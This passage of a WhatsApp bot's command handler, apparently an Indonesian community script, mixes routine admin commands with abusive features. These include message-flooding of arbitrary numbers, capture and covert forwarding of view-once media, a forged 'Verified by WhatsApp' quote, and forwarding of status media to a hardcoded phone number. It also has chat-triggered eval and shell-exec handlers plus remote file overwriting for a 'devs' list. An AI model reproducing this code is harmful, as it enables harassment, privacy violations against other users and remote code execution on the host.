                } else reply(`Reply media dengan caption \`${prefix}tourl\``);
            }
            break;

            case 'getname':
                if (m.quoted || text) await reply(await client.getName(froms));
                else reply('Tag atau reply pesan target!');
                break;

            case 'getpp': {
                if (m.quoted || text) {
                    let pporang = await client.profilePictureUrl(froms, 'image').catch(_ => reply('Profile di private!'));
                    if (pporang) return client.sendMessage(m.chat, { image: { url: pporang } }, { quoted: m, ephemeralExpiration: m.expiration });
                } else reply('Tag atau reply pesan target!');
            }
            break;

            case 'getbio': {
                if (m.quoted || text) {
                    let biou = (await client.fetchStatus(froms).catch(err => console.log(chalk.redBright('[ ERROR ]'), chalk.whiteBright(err))) || {}).status || 'Bio di private!';
                    reply(biou);
                } else reply('Tag atau reply pesan target!');
            }
            break;

            case 'setprefix':
                if (!isOwner) return reply(config.mess.owner);
                if (!text) return m.reply(func.example(cmd, '#'));
                if (args[0] == prefix) return reply('Prefix already this.');
                setting.prefix = args[0];
                client.sendReact(m.chat, '✅', m.key);
                break;

            case 'setwm': {
                if (!isOwner) return reply(config.mess.owner);
                if (!text) return m.reply(func.example(cmd, 'Sticker by|ẉ.ceo/Surya\n\n+week untuk hari\n+date untuk tanggal\n+time untuk waktu'));
                let [pack, ...authArr] = text.split('|');
                let authStr = (authArr || []).join('|');
                setting.packname = pack || '';
                setting.author = authStr || '';
                client.sendReact(m.chat, '✅', m.key);
            }
            break;

            case 'setstag':
            case 'setstickertag': {
                if (!isOwner) return reply(config.mess.owner);
                if (/webp/.test(mime)) {
                    let buffer = await quoted.download();
                    let catbox = await func.catbox(buffer);
                    if (!catbox.status) return m.reply(catbox.message);
                    setting.stickertag = catbox.url;
                    client.sendReact(m.chat, '✅', m.key);
                } else reply(`reply stikernya dengan caption ${cmd}`);
            }
            break;

            case 'setbotname': {
                if (!isOwner) return reply(config.mess.owner);
                if (!text) return reply(func.example(cmd, 'yaudah iya'));
                if (text.length > 20) return m.reply('Max 20 character!');
                if (setting.botname == text) return reply('botname already this.');
                setting.botname = text;
                client.sendReact(m.chat, '✅', m.key);
            }
            break;

            case 'restart':
                if (!isOwner) return reply(config.mess.owner);
                if (args[0] !== '-y') {
                    return // reply(`⚠️ *Tindakan Dibatalkan*\n\nApakah kamu yakin ingin me-restart bot?\nKetik *${cmd} -y* untuk melanjutkan agar terhindar dari ketidaksengajaan.`);
                }

                await client.reply(m.chat, func.texted('monospace', `Restarting...`), m, { expiration: m.expiration }).then(async () => {
                    await multidb.save();
                    process.exit(1);
                });
                break;

            case 'clearsession': {
                if (!isOwner) return reply(config.mess.owner);
                let sessionFile = config.owner === m.bot ? config.session : global.db.jadibot.find(x => x.number === m.bot).session;
                fs.readdir(sessionFile, (err, files) => {
                    if (err) return m.reply(func.jsonFormat(err));
                    for (const file of files) {
                        if (file !== 'creds.json') {
                            fs.unlink(path.join(sessionFile, file), err => {
                                if (err) return m.reply(err.message);
                            });
                        }
                    }
                    m.reply(`Successfully clear ${files.length - 1} files sessions.`);
                });
            }
            break;

            case 'setpp': {
                if (!isOwner) return reply(config.mess.owner);
                if (/image\/(jpe?g|png)/.test(mime)) {
                    await client.sendReact(m.chat, '🕒', m.key);
                    if (/^full$/i.test(args[0])) {
                        try {
                            const media = await quoted.download();
                            const img = await sharp(media)
                                .resize(720, 720, {
                                    fit: "inside",
                                    withoutEnlargement: true
                                })
                                .jpeg({ quality: 100 })
                                .toBuffer();

                            await client.query({
                                tag: 'iq',
                                attrs: {
                                    to: S_WHATSAPP_NET,
                                    type: 'set',
                                    xmlns: 'w:profile:picture'
                                },
                                content: [
                                    {
                                        tag: 'picture',
                                        attrs: { type: 'image' },
                                        content: img
                                    }
                                ]
                            });

                            await client.sendReact(m.chat, '✅', m.key);
                        } catch (e) {
                            console.log(e);
                            await m.reply('Terjadi kesalahan, coba lagi nanti.');
                        }
                    } else {
                        let media = await quoted.download();
                        await client.updateProfilePicture(m.bot, media);
                        await client.sendReact(m.chat, '✅', m.key);
                    }
                } else reply(`Send/Reply Images with caption *${cmd}*`);
            }
            break;

            case 'rvo':
            case 'rvn':
            case 'cantik':
            case '😋':
            case '👀': {
                try {
                    if (quoted?.viewOnce) {
                        const ownerJid = /cantik|👀|😋/.test(command) ? m.bot : m.chat;
                        let buffer = await quoted.download();
                        let caption = quoted?.caption || '';
                        if (/video/.test(quoted.mime)) {
                            await client.sendMessage(ownerJid, { video: buffer, caption, mentions: client.ments(caption) }, { quoted: m, ephemeralExpiration: m.expiration });
                        } else if (/image\/(jpe?g|png)/.test(quoted.mime)) {
                            await client.sendMessage(ownerJid, { image: buffer, caption, mentions: client.ments(caption) }, { quoted: m, ephemeralExpiration: m.expiration });
                        } else if (/audio/.test(quoted.mime)) {
                            await client.sendMessage(ownerJid, { audio: buffer, mimetype: 'audio/ogg; codecs=opus', ptt: true }, { quoted: m, ephemeralExpiration: m.expiration });
                        }
                    }
                   // else m.reply('Reply view once message to use this command.');
                } catch (error) {
                    console.log(error);
                    return client.reply(m.chat, `Something went wrong: ${error.message}`, m, { expiration: m.expiration });
                }
            }
            break;

            case 'f': 
            case 'sv': {
                if (!m.isPc) return;
                if (!m.quoted) return;
                if (m.quoted?.chat !== 'status@broadcast') return;
                try {
                    await m.quoted.copyNForward(m.chat, false);
                    client.sendReact(m.chat, '✅', m.key);
                } catch (error) {
                    console.log(error);
                    client.sendReact(m.chat, '❌', m.key);
                }
            }
            break;

            case 'block':
                if (!isOwner) return reply(config.mess.owner);
                if (!froms) return m.reply(`Mention or Reply chat target.`);
                client.updateBlockStatus(froms, 'block')
                    .then(() => client.sendReact(m.chat, '✅', m.key))
                    .catch(() => client.sendReact(m.chat, '❌', m.key));
                break;

            case 'unblock':
                if (!isOwner) return reply(config.mess.owner);
                if (!froms) return m.reply(`Mention or Reply chat target.`);
                client.updateBlockStatus(froms, 'unblock')
                    .then(() => client.sendReact(m.chat, '✅', m.key))
                    .catch(() => client.sendReact(m.chat, '❌', m.key));
                break;

            case 'listblock': {
                if (!isOwner) return reply(config.mess.owner);
                let listblok = await client.fetchBlocklist().catch((_) => []);
                m.reply('乂 *L I S T - B L O C K*\n' + `Total: ${listblok == undefined ? '*0* Diblokir' : '*' + listblok.length + '* Diblokir'}\n\n` + listblok.map(v => '- @' + v.replace(/@.+/, '')).join('\n'));
            }
            break;

            case 'spam': {
                let [idspam, countspam, textspam] = text.split('|').map(x => x.trim());
                if (!(idspam && countspam)) return reply(func.example(cmd, '62xxx|10'));
                if (!textspam && !/(audio|webp)/.test(mime)) return reply(func.example(cmd, '62xxx|10|sayang'));
                if (isNaN(countspam)) return m.reply(`Harus nomor kocak!`);
                if (Number(countspam) > 100) return m.reply('Kebanyakan kocak!');
                
                const target = idspam.replace(/\D/g, '') + '@s.whatsapp.net';
                let [exists] = await client.onWhatsApp(target);
                if (!exists) return m.reply('Masukkan nomor yang valid dan terdaftar di WhatsApp!');
                
                m.reply('Wait sedang menyepam...');
                if (/image\/(jpe?g|png)|audio|video|webp/.test(mime)) {
                    let fakeObj;
                    if (m.quoted && m.quoted.fakeObj) {
                        fakeObj = { ...m.quoted.fakeObj };
                        fakeObj.message[m.quoted.mtype].caption = textspam;
                    } else {
                        fakeObj = { ...m };
                        fakeObj.message[m.mtype].caption = textspam;
                    }
                    for (let i = 0; i < countspam; i++) {
                        await client.copyNForward(target, fakeObj, true);
                        await func.delay(500);
                    }
                } else {
                    for (let i = 0; i < countspam; i++) {
                        await client.sendMessage(target, { text: textspam, mentions: client.ments(textspam) });
                    }
                }
                client.sendReact(m.chat, '✅', m.key);
            }
            break;

            case 'sending': {
                if (!m.quoted || !text) return;
                let other = func.wa(text);
                if (other === '@s.whatsapp.net') return client.sendReact(m.chat, '❌', m.key);
                await client.copyNForward(other, m.quoted.fakeObj, false, {
                    quoted: {
                        key: { participant: '0@s.whatsapp.net', remoteJid: '0@s.whatsapp.net' },
                        message: { conversation: 'SuryaDev Verified by WhatsApp' }
                    }
                });
                client.sendReact(m.chat, '✅', m.key);
            }
            break;

            case 'jadibot': {
                if (!devs.includes(m.sender)) return;
                if (!froms) return m.reply(`Mention or Reply chat target.`);
                client.sendReact(m.chat, '🕒', m.key);

                let durationArg = args[0] && isNaN(args[0]) && !args[0].includes('@') ? args[0].toLowerCase() :
                                  args[1] ? args[1].toLowerCase() : '30';

                let expiredTime;
                if (/permanen|permanent/i.test(durationArg)) {
                    expiredTime = 'PERMANENT';
                } else {
                    let days = parseInt(durationArg) || 30;
                    expiredTime = Date.now() + (days * 86400000);
                }

                const botname = generateRandomName();
                const number = froms.replace(/\D/g, '');
                const targetJid = number + '@s.whatsapp.net';
                const index = global.db.jadibot.findIndex(x => x.number === targetJid);
                
                const CLONE = global.db.jadibot[index] || {
                    status: true,
                    number: targetJid,
                    botname: store.contacts[targetJid]?.name || botname,
                    session: 'clone/session-' + number,
                    expired: expiredTime
                };

                if (index === -1) global.db.jadibot.push(CLONE);
                else {
                    global.db.jadibot[index].status = true;
                    global.db.jadibot[index].expired = expiredTime;
                }

                const bot = new WhatsAppBot(CLONE);
                if (!fs.existsSync(CLONE.session + '/creds.json')) {
                    let caption = `Masukkan kode di bawah untuk jadi bot:\n1. klik titik tiga di pojok kanan atas\n2. klik "Perangkat tertaut"\n3. klik "Tautkan Perangkat"\n4. klik "Tautkan dengan nomor telepon saja"\n5. masukkan 6 digit kode: ${config.pairing?.code || "SURYADEV"}`;
                    await reply(caption);
                }
                bot.connect().catch(() => bot.connect());
                console.log('Starting Bot Clone. . .');
            }
            break;

            case 'renewsewa':
            case 'sewa+':
            case 'sewa-': {
                if (!devs.includes(m.sender)) return;

                // 1. Cari argumen waktu terlebih dahulu
                let timeArg = args.find(x => /^\d+[smhdy]$/i.test(x));

                // 2. Tentukan target dengan cara membuang argumen waktu dari teks
                let target = false;
                if (m.quoted) {
                    target = m.quoted.sender;
                } else if (args.length > 0) {
                    // Filter/buang '30d' dari args, lalu gabungkan sisanya (+62 821-6451-8299)
                    let phoneStr = args.filter(x => x !== timeArg).join(' ');

                    // Bersihkan dari spasi, strip, dan tanda plus. HANYA SISAKAN ANGKA.
                    let cleanedNumber = phoneStr.replace(/\D/g, ''); 

                    if (cleanedNumber.length > 4) {
                        target = cleanedNumber + '@s.whatsapp.net';
                    }
                }

                if (!target) {
                    return m.reply(`Mention, Reply, atau masukkan nomor target!\nContoh: ${cmd} 30d @tag\nAtau: ${cmd} 30d +62 821-xxxx-xxxx`);
                }

                if (!timeArg) {
                    return m.reply(`✗ Format waktu tidak valid atau tidak ditemukan!\n\n*Gunakan akhiran berikut:*\n- *s* = detik (contoh: 30s)\n- *m* = menit (contoh: 30m)\n- *h* = jam (contoh: 12h)\n- *d* = hari (contoh: 30d)\n- *y* = tahun (contoh: 1y)\n\n*Contoh Penggunaan:*\n${cmd} 30d @tag\n${cmd} 1y +62 821-xxxx`);
                }

                let durationMs;
                try {
                    durationMs = toMs(timeArg); // Mengkonversi ke milidetik
                } catch (e) {
                    return m.reply(`✗ Terjadi kesalahan dalam memproses waktu "${timeArg}". Pastikan formatnya sesuai contoh!`);
                }

                if (!durationMs) return m.reply(`✗ Gagal menghitung durasi dari "${timeArg}".`);

                const index = global.db.jadibot.findIndex(x => x.number === target);
                if (index === -1) return m.reply(`✗ Data jadibot untuk @${target.split('@')[0]} tidak ditemukan.`);

                let currentExpire = global.db.jadibot[index].expired;
                if (currentExpire === 'PERMANENT') return m.reply('Jadibot ini berstatus permanen.');

                if (command === 'sewa-') {
                    global.db.jadibot[index].expired = Math.max(Date.now(), currentExpire - durationMs);
                    m.reply(`✓ Berhasil mengurangi masa aktif untuk @${target.split('@')[0]}\nDurasi pemotongan: ${timeArg}`);
                } else {
                    global.db.jadibot[index].expired = currentExpire + durationMs;
                    m.reply(`✓ Berhasil menambah masa aktif untuk @${target.split('@')[0]}\nDurasi penambahan: ${timeArg}`);
                }
            }
            break;

            case 'stopjadibot':
            case 'stopbot': {
                if (!devs.includes(m.sender)) return;
                let target = froms || (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : false);
                if (!target) return m.reply('Mention, Reply, atau masukkan nomor target jadibot.');

                const index = global.db.jadibot.findIndex(x => x.number === target);
                if (index === -1) return m.reply('✗ Data jadibot tidak ditemukan.');

                let data = global.db.jadibot[index];
                data.status = false; 

                const arraySocket = socket.getAllSockets ? socket.getAllSockets() : [];
                const clientSocket = socket.get ? socket.get(target) : arraySocket.find(v => v.user && v.user.jid.includes(target.split('@')[0]));

                if (clientSocket) {
                    try {
                        if (socket.delete) socket.delete(target);
                        /*try { await clientSocket.logout(); } catch (e) {
                            console.log(`[JADIBOT] Abaikan error network logout:`, e.message);
                        }*/
                        clientSocket.end("Close");
                        if (clientSocket.ws) clientSocket.ws.close();
                    } catch (e) {
                        console.log(`[JADIBOT] Error stopping client:`, e.message);
                    }
                }

                client.sendReact(m.chat, '✅', m.key);
                m.reply(`✓ Berhasil mematikan koneksi jadibot @${target.split('@')[0]}`);
            }
            break;

            case 'startjadibot':
            case 'startbot': {
                if (!devs.includes(m.sender)) return;
                let target = froms || (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : false);
                if (!target) return m.reply('Mention, Reply, atau masukkan nomor target jadibot.');

                const index = global.db.jadibot.findIndex(x => x.number === target);
                if (index === -1) return m.reply('✗ Data jadibot tidak ditemukan.');

                let CLONE = global.db.jadibot[index];

                const arraySocket = socket.getAllSockets ? socket.getAllSockets() : [];
                const isSocketConnected = (socket.get && socket.get(target)) || arraySocket.find(v => v.user && v.user.jid.includes(target.split('@')[0]));

                if (isSocketConnected) {
                    return m.reply('✗ Sesi jadibot kamu sudah aktif dan terhubung!');
                }

                CLONE.status = true;

                m.reply(`🕒 Sedang memulai ulang jadibot @${target.split('@')[0]}...`);
                
                const bot = new WhatsAppBot(CLONE);
                bot.connect().catch(() => bot.connect());
                client.sendReact(m.chat, '✅', m.key);
            }
            break;

            case 'deljadibot':
            case 'delsesibot': {
                if (!devs.includes(m.sender)) return;
                let target = froms || (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : false);
                if (!target) return m.reply('Mention, Reply, atau masukkan nomor target jadibot.');

                const index = global.db.jadibot.findIndex(x => x.number === target);
                if (index === -1) return m.reply('✗ Data jadibot tidak ditemukan atau tidak ada sesi aktif.');

                let data = global.db.jadibot[index];
                let sessionFile = data.session;
                let isSessionDeleted = false;

                const arraySocket = socket.getAllSockets ? socket.getAllSockets() : [];
                const clientSocket = socket.get ? socket.get(target) : arraySocket.find(v => v.user && v.user.jid.includes(target.split('@')[0]));

                if (clientSocket) {
                    try {
                        if (socket.delete) socket.delete(target);
                        try { await clientSocket.logout(); } catch (e) {
                            console.log(`[JADIBOT] Abaikan error network logout:`, e.message);
                        }
                        clientSocket.end("Close");
                        if (clientSocket.ws) clientSocket.ws.close();
                    } catch (e) {
                        console.log(`[JADIBOT] Error stopping client:`, e.message);
                    }
                }

                if (sessionFile && fs.existsSync(sessionFile)) {
                    try {
                        fs.rmSync(sessionFile, { recursive: true, force: true });
                        isSessionDeleted = true;
                    } catch (err) {
                        console.error(`[JADIBOT] Gagal menghapus file sesi:`, err.message);
                    }
                }

                global.db.jadibot.splice(index, 1);

                client.sendReact(m.chat, '✅', m.key);
                if (isSessionDeleted || clientSocket) {
                    m.reply(`✓ Berhasil menghapus data dan sesi jadibot untuk @${target.split('@')[0]}.`);
                } else {
                    m.reply(`✓ Data direset, namun folder sesi untuk @${target.split('@')[0]} tidak ditemukan di sistem.`);
                }
            }
            break;

            case 'listbot':
            case 'listjadibot': {
                const jadibots = global.db.jadibot;
                if (!jadibots || jadibots.length === 0) {
                    return m.reply('✗ No Jadibot data registered.');
                }

                let connectedCount = 0;
                const userEntries = [];

                // Ambil semua socket yang berjalan
                const arraySocket = socket.getAllSockets ? socket.getAllSockets() : [];

                for (const botData of jadibots) {
                    const jid = botData.number;

                    // Ambil instance socket dari target
                    const clientSocket = socket.get ? socket.get(jid) : arraySocket.find(v => v.user && v.user.jid.includes(jid.split('@')[0]));
                    const lines = [];

                    // 1. Pengecekan Real-Time dari WebSocket
                    const isSocketConnected = !!(clientSocket && clientSocket.ws && clientSocket.ws.socket && clientSocket.ws.socket.readyState === 1);

                    // 2. Koreksi Fake Data / Zombie State
                    let displayState = botData.state || (botData.status ? 'CONNECTED' : 'OFFLINE');
                    let displayReason = botData.reason || 'Not connected / Empty session';

                    if ((botData.status || displayState === 'CONNECTED') && !isSocketConnected) {
                        displayState = 'DISCONNECTED';
                        displayReason = 'Socket dead / Failed to link device';

                        // Auto-koreksi database
                        botData.state = 'DISCONNECTED';
                        botData.reason = displayReason;
                    } else if (isSocketConnected) {
                        displayState = 'CONNECTED';
                        displayReason = 'Connected to server';

                        botData.state = 'CONNECTED';
                        botData.reason = displayReason;
                    }

                    const isConnected = isSocketConnected;
                    const statusEmoji = isConnected ? '✅' : '❌';

                    lines.push(`╭─ 〄 @${jid.split('@')[0]}`);
                    lines.push(`├ › *Name:* ${botData.botname || 'WhatsApp Bot'}`);
                    lines.push(`├ › *Status:* ${displayState} ${statusEmoji}`);

                    if (!isConnected) {
                        lines.push(`├ ! *Reason:* ${displayReason}`);
                    }

                    // 3. Waktu Expired
                    const expiredTime = botData.expired || 0;
                    const expiryText = /PERMANENT/i.test(expiredTime) ? 'Permanent' : (expiredTime === 0 ? 'Not set' : expireTime(expiredTime));
                    lines.push(`├ › *Expire:* ${expiryText}`);

                    // 4. Uptime (Hanya jika connected)
                    if (isConnected && clientSocket?.user?.uptime) {
                        const uptimeMs = Date.now() - clientSocket.user.uptime;
                        const uptimeText = func.clockString(uptimeMs);
                        lines.push(`├ › *Uptime:* ${uptimeText}`);
                    }

                    // 5. Ukuran Session
                    const sessionPath = botData.session;
                    if (sessionPath && fs.existsSync(sessionPath)) {
                        try {
                            const sessionFiles = fs.readdirSync(sessionPath);
                            const totalSize = sessionFiles.reduce((acc, file) => {
                                const filePath = path.join(sessionPath, file);
                                const stats = fs.statSync(filePath);
                                return acc + (stats.isFile() ? stats.size : 0);
                            }, 0);
                            
                            // Menggunakan fungsi sizeString dari client.js
                            const sizeStr = sizeString(totalSize);
                            lines.push(`├ › *Session Size:* ${sizeStr}`);
                        } catch (e) {
                            lines.push('├ › *Session Size:* Error reading');
                        }
                    } else {
                        lines.push('├ › *Session Size:* 0 Bytes (No Session)');
                    }

                    lines.push('╰───');

                    userEntries.push(lines.join('\n'));
                    if (isConnected) connectedCount++;
                }

                const header = '乂  *J A D I B O T  -  S T A T U S*';
                const footer = `*Total Bots:* ${jadibots.length} | *Active:* ${connectedCount}`;

                const caption = [
                    header,
                    ...userEntries,
                    footer
                ].join('\n\n');

                await m.reply(caption);
            }
            break;

            case 'backupsc':
            case 'backupme': {
                if (!devs.includes(m.sender)) return;
                client.sendReact(m.chat, '🕒', m.key);
                try {
                    let backupName = `backup_${new Date().toISOString().replace(/:/g, '-')}.zip`;
                    let output = fs.createWriteStream(backupName);
                    let archive = archiver('zip', { zlib: { level: 9 } });
                    archive.pipe(output);
                    archive.on('warning', function(err) {
                        if (err.code === 'ENOENT') console.warn(err);
                        else return m.reply(String(err));
                    });
                    
                    archive.glob('**/*', { cwd: process.cwd(), ignore: ['node_modules/**/*', 'temp/**/*', 'core/**', '.cache/**', '.npm/**', backupName] });
                    await archive.finalize();
                    
                    let caption = `Berikut adalah file backup kode bot:\nNama file: ${backupName}\nUkuran file: ${(archive.pointer() / 1024 / 1024).toFixed(2)} MB`;
                    await client.sendMessage(devs[0], {
                        document: { url: `./${backupName}` },
                        caption: caption,
                        mimetype: 'application/zip',
                        fileName: backupName
                    }, { quoted: m, ephemeralExpiration: m.expiration })
                    .then(_ => fs.unlinkSync(backupName));
                } catch (error) {
                    console.error(error);
                    m.reply('Terjadi kesalahan saat membuat backup :\n\n' + String(error));
                }
            }
            break;

            case 'upm': {
                if (!devs.includes(m.sender)) return;
                if (!text) return m.reply(func.example(cmd, 'client + reply code'));
                if (!quoted) return m.reply('Reply text atau file scriptnya.');
                
                let value = text.trim().toLowerCase();
                
                // Pastikan nama file berakhiran .js (jadi bisa ketik "client" atau "client.js")
                let fileName = value.endsWith('.js') ? value : value + '.js';
                
                // Tentukan jalur pencarian file
                let rootPath = path.join(process.cwd(), fileName);
                let systemPath = path.join(process.cwd(), 'system', fileName);
                let filepath;
                
                // Pengecekan dinamis: Cari di root, jika tidak ada cari di system/
                if (fs.existsSync(rootPath)) {
                    filepath = rootPath;
                } else if (fs.existsSync(systemPath)) {
                    filepath = systemPath;
                } else {
                    return m.reply(`✗ File *${fileName}* tidak ditemukan di folder utama maupun folder 'system'.\nPastikan nama file sudah benar.`);
                }
                
                let code;
                if (/(text|application)\/javascript/.test(mime)) {
                    code = await quoted.download();
                } else {
                    code = m.quoted ? m.quoted.text : null;
                }
                
                if (!code) return m.reply('✗ Gagal membaca kode! Pastikan kamu me-reply teks script atau file dokumen .js.');
                
                try {
                    // Simpan file
                    await fs.promises.writeFile(filepath, code);
                    // Bikin output letak path-nya biar kamu tahu file mana yang ke-replace
                    let displayPath = filepath.replace(process.cwd(), '').replace(/\\/g, '/');
                    client.sendMessage(m.chat, { text: `Success updated file:\n*${displayPath}*` }, { quoted: m, ephemeralExpiration: m.expiration });
                } catch (err) {
                    console.error(err);
                    m.reply(`✗ Gagal menyimpan file: ${err.message}`);
                }
            }
            break;

            case 'minifyall': {
                if (!isOwner) return reply(config.mess.owner);
                
                if (args[0] !== '-y') {
                    let warnMsg = `⚠️ *PERINGATAN BERBAHAYA*\n\n`;
                    warnMsg += `Fitur ini akan membuat *Backup Otomatis* lalu mengompres (minify) folder 'system' dan file utama bot secara permanen.\n\n`;
                    warnMsg += `Jika kamu yakin ingin melanjutkan, ketik:\n*${cmd} -y*`;
                    return reply(warnMsg);
                }

                // client.sendReact(m.chat, '🕒', m.key);
                await reply('📦 *LANGKAH 1/2:* Memulai proses backup otomatis sebelum minifikasi...\n_Mohon tunggu sebentar..._');

                let backupName = `backup_${new Date().toISOString().replace(/:/g, '-')}.zip`;
                
                try {
                    await new Promise((resolve, reject) => {
                        const output = fs.createWriteStream(backupName);
                        const archive = archiver('zip', { zlib: { level: 9 } });

                        output.on('close', resolve);
                        archive.on('error', reject);

                        archive.pipe(output);
                        archive.glob('**/*', { 
                            cwd: process.cwd(), 
                            ignore: ['node_modules/**/*', 'sampah/**/*', 'temp/**/*', 'session/**/*', 'clone/**/*', '.cache/**/*', '.npm/**/*', backupName] 
                        });
                        archive.finalize();
                    });

                    let captionBackup = `✅ *BACKUP SELESAI*\n\nBerikut adalah file backup *Source Code Asli* kamu sebelum di-minify:\n- Ukuran file: ${(fs.statSync(backupName).size / 1024 / 1024).toFixed(2)} MB\n\n🚀 _Sedang melanjutkan ke proses minifikasi..._`;
                    
                    await client.sendMessage(m.chat, {
                        document: { url: `./${backupName}` },
                        caption: captionBackup,
                        mimetype: 'application/zip',
                        fileName: backupName
                    }, { quoted: m, ephemeralExpiration: m.expiration });
                    
                    fs.unlinkSync(backupName);

                } catch (error) {
                    console.error('Error saat pre-backup:', error);
                    if (fs.existsSync(backupName)) fs.unlinkSync(backupName);
                    return reply('✗ *GAGAL BACKUP!* Terjadi kesalahan saat membuat zip otomatis. Proses minifikasi *DIBATALKAN* demi keamanan kodemu:\n\n' + String(error));
                }

                let terser;
                try {
                    terser = await import('terser');
                } catch (e) {
                    return reply('✗ Modul "terser" belum terinstall. Ketik di terminal: npm install terser');
                }

                // Fungsi spesifik untuk scan folder system saja
                const getSystemJSFiles = async (dir) => {
                    let results = [];
                    try {
                        const list = await fs.promises.readdir(dir, { withFileTypes: true });
                        for (const file of list) {
                            const fullPath = path.resolve(dir, file.name);
                            if (file.isDirectory()) {
                                results = results.concat(await getSystemJSFiles(fullPath));
                            } else if (file.name.endsWith('.js')) {
                                results.push(fullPath);
                            }
                        }
                    } catch (e) {
                        console.log('Folder system tidak ditemukan atau error:', e.message);
                    }
                    return results;
                };

                try {
                    // 1. Ambil semua file JS di dalam folder 'system'
                    const systemDir = path.join(process.cwd(), 'system');
                    let targetFiles = await getSystemJSFiles(systemDir);

                    // 2. Tambahkan file JS inti yang ada di root direktori
                    const rootFiles = ['main.js', 'index.js', 'clone.js', 'client.js'];
                    for (const file of rootFiles) {
                        const fullPath = path.join(process.cwd(), file);
                        if (fs.existsSync(fullPath)) {
                            targetFiles.push(fullPath);
                        }
                    }

                    let successCount = 0;
                    let failedCount = 0;
                    let failedFiles = [];

                    for (const file of targetFiles) {
                        try {
                            const code = await fs.promises.readFile(file, 'utf-8');
                            
                            // Eksekusi Terser Minify (Settingan Rata Kanan / Suhu)
                            const minified = await terser.minify(code, {
                                module: true, // Format ESM
                                toplevel: true, // Singkat semua variabel terluar
                                compress: {
                                    drop_console: false, // Sisakan console.log biar terminal nggak mati
                                    // keep_fnames: true, // Jaga nama fungsi agar auto-reload tidak rusak
                                    passes: 2
                                },
                                mangle: {
                                    toplevel: true // Acak total semua nama variabel global
                                },
                                format: { 
                                    comments: false // Musnahkan 100% komentar di dalam file
                                }
                            });

                            if (minified.code) {
                                await fs.promises.writeFile(file, minified.code, 'utf-8');
                                successCount++;
                            } else {
                                failedCount++;
                                failedFiles.push(path.basename(file));
                            }
                        } catch (err) {
                            console.error(`✗ Gagal minify ${file}:`, err.message);
                            failedCount++;
                            failedFiles.push(path.basename(file));
                        }
                    }

                    let finishMsg = `🔥 *LANGKAH 2/2 SELESAI*\n\n`;
                    finishMsg += `Proses minifikasi telah berhasil diterapkan pada folder 'system' & file inti bot.\n\n`;
                    finishMsg += `📄 File Diproses: ${targetFiles.length}\n`;
                    finishMsg += `🟢 Berhasil: ${successCount}\n`;
                    finishMsg += `🔴 Gagal: ${failedCount}\n`;
                    
                    if (failedCount > 0) {
                        finishMsg += `\n*File Gagal:* ${failedFiles.join(', ')}`;
                    }
                    
                    finishMsg += `\n_Catatan: Jika ada fungsi yang error, silakan ekstrak kembali file Backup ZIP yang baru saja dikirim._`;

                    await reply(finishMsg);
                    client.sendReact(m.chat, '✅', m.key);
                    
                } catch (e) {
                    console.error('Minify Error:', e);
                    reply(`✗ Terjadi kesalahan sistem saat minify: ${e.message}`);
                }
            }
            break;

            default: {
                if (devs.includes(m.sender)) {
                    if (m.body.startsWith('~ ')) {
                        try {
                            let evaled = await eval(m.body.slice(2));
                            if (typeof evaled !== 'string') evaled = util.inspect(evaled);
                            await m.reply(evaled);
                        } catch (err) {
                            await m.reply(err.message);
                        }
                    } else if (m.body.startsWith('~~ ')) {
                        try {
                            const evaling = await eval(`;(async () => { ${text} })();`);
                            return client.sendMessage(m.chat, { text: util.format(evaling) }, { quoted: m, ephemeralExpiration: m.expiration });
                        } catch (e) {
                            return client.sendMessage(m.chat, { text: util.format(e) }, { quoted: m, ephemeralExpiration: m.expiration });
                        }
                    } else if (m.body.startsWith('$ ')) {
                        exec(m.body.slice(2), (err, stdout) => {
                            if (err) return m.reply(`${err}`);
                            if (stdout) return m.reply(stdout);
                        });
                    }
                }
            }
        } // akhir dari switch command
        // Reaction Commands By SuryaDev
        if (m.mtype === 'reactionMessage' && isOwner) {
            const reaction = m.message?.reactionMessage?.text;
            const key = m.msg.key;
            const msg = await store.loadMessage(key.id);
            if (!msg) return
            // msg.chat === 'status@broadcast' && console.log("REACT", m.message);
            if (!msg.message) return;
            let mtype = Object.keys(msg.message);
            mtype = /messageContextInfo/.test(mtype[0]) ? mtype[1] : mtype[0];
            msg.broadcast && console.log("MSG REACT", msg);
            switch (reaction) {
                case '💚': {
                    console.log("CASE REACT", { chat: msg.chat, mtype: msg.mtype });
                    if (!msg.broadcast) return // m.reply('React story wa yang ingin disimpan!')
                    let to = "62895415497664@s.whatsapp.net";
                    if (/imageMessage/.test(msg.mtype)) {
                        let imageBuffer = await msg.download();
                        await client.sendMessage(to, {
                            image: imageBuffer,
                            caption: msg?.msg?.caption || '',
                        }, {
                            quoted: msg,
                            ephemeralExpiration: msg.expiration
                        })
                    } else if (/videoMessage/.test(msg.mtype)) {
                        let videoBuffer = await msg.download();
                        await client.sendMessage(to, {
                            video: videoBuffer,
                            caption: msg?.msg?.caption || '',
                        }, {
                            quoted: msg,
                            ephemeralExpiration: msg.expiration
                        })
                    } else if (/audioMessage/.test(msg.mtype)) {
                        let audioBuffer = await msg.download();
                        await client.sendMessage(to, {
                            audio: audioBuffer,
                            mimetype: msg.mime || 'audio/mpeg',
                            ptt: true,
                        }, {
                            quoted: msg,
                            ephemeralExpiration: msg.expiration
                        })
                    } else if (/extendedTextMessage|conversation/.test(msg.mtype)) {
                        await client.sendMessage(to, {
                            text: msg.msg.text ? msg.msg.text : ''
                        }, {
                            quoted: msg,
                            ephemeralExpiration: msg.expiration
                        })
                    }
                }
                break
                case '🔥': {
                    try {
                        let q = await client.serializeM(msg);
                        if (!q.quoted) return console.log(q);
                        await q.quoted.copyNForward(m.chat, true)
                    } catch (error) {
                        console.log(error)
                    }
                }
                case '🤩': {
                    if (/image|webp/.test(msg.mime)) {
                        let media = await msg.download()
                        await client.sendStickerFromUrl(m.chat, media, msg, {
                            packname,
                            author,
                            expiration: msg.expiration
                        })
                    } else if (/video/.test(msg.mime)) {
                        if (msg.seconds > 11) return
                        let media = await msg.download()
                        await client.sendSticker(m.chat, media, msg, {
                            packname,
                            author,
                            expiration: msg.expiration
                        })
                    }
                }
                break
            } // akhir dari switch reaction
        }
    } catch (error) {
        console.log(error);
        const errMsg = util.format(error);
        if (m.isGc) client.reply(config.developer, errMsg, m, { expiration: m.expiration });
        else client.reply(m.bot, errMsg, m, { expiration: m.expiration });
    }
};